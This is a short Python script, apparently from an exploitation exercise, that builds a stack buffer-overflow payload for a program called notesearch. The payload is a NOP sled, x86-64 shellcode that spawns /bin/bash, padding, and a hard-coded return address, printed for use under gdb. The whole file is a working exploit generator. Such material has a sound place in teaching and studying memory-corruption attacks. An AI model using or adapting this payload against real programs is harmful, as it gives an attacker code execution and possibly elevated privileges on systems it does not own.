#!/usr/bin/python

# Payload generator for use in gdb
# generate payload in new file
# debug notesearch with gdb
# provide payloadfile -> run $(cat payloadfile)

# note: change return_address to your needs

## Payload Laenge
payload_length = 120
## NOPs
nop_length = 56
## Return address
return_address = '\x50\xe3\xff\xff\xff\x7f\x00\x00'

##return_address = 8*return_address

##shellcode
buf = "\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0"
buf += "\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x62\x61\x73\x68"



## Nop sled
nop_sled = "\x90" * nop_length

## padding
padding = 'A' * (payload_length - nop_length - len(buf))

print nop_sled + buf + padding + return_address
